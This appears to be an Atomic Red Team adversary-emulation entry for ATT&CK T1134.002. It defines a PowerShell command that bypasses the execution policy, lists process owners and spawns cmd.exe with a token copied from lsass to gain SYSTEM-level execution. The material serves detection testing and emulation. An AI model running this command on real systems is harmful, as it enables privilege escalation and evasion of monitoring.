- id: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
  name: Access Token Manipulation
  description: "This Action demonstrates how an access token for a specific program\
    \ can spawn another program under a different owner. \nAdversaries can leverage\
    \ access tokens to run programs under a different user not only to achieve privilege\
    \ escalation but also to evade detection by blending in with normal user activity.\
    \ \nThis Action will query all processes and list the process name and owner.It\
    \ will then make a copy of an existing token to create a new instance of cmd.exe"
  tactic: defense-evasion
  technique:
    attack_id: T1134.002
    name: Create Process with Token
  platforms:
    windows:
      psh:
        command: Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{};
          gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process
          | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}; & "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1";
          [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
        elevation_required: true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - t1134.002
  - defense-evasion
  author: Atomic Red Team
  additional_info:
    technique_created: '2020-02-18T16:48:56.582Z'
    atomic_guid: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
    import_timestamp: '2025-08-17T03:26:13.759836Z'
